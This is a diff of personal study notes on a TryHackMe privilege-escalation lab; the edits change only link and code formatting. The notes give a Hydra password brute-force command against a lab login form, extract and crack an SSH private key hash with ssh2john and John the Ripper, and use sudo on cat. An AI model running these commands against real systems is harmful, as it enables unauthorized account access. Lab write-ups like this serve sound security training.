@@ -4,25 +4,24 @@
 Source: #tryhackme #privesc 
 
 Tags:  [[Cryptography]]
-
 #### Hydra brute force
 
 we have a website that has a simple login page with username and password 
 we find the username from the source code 
-use [[hydra]] to brute force the password
+use [[Tags/hydra]] to brute force the password
 ```
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.91.80 http-post-form '/admin/:user=^USER^&pass=^PASS^:Username or password invalid'
 ```
 #### cracking rsa 
 
-after logging in the website we find a ssh rsa private key, wget it from the website  
-The special John the Ripper tool called **ssh2john.py** which can extract the crackable hash from the RSA private key. (don't save o/p in a text file)
+after logging in the website we find a [[ssh]] `rsa` private key, `wget` it from the website  
+The special John the Ripper tool called **ssh2john.py** which can extract the crackable hash from the [[RSA]] private key. (don't save o/p in a text file)
 ```
  /usr/share/john/ssh2john.py id_rsa  > rsa.hash
 ```
-then user rockyou wordlist with john to crack the pass 
-chmod the original id_rsa file - `chmod 600 id_rsa`
-use ssh to login as john
+then user `rockyou` wordlist with john to crack the pass 
+`chmod` the original `id_rsa` file - `chmod 600 id_rsa`
+use `ssh` to login as john
 #### Priv esc
 
 `sudo -l` -> can run `cat` with sudo
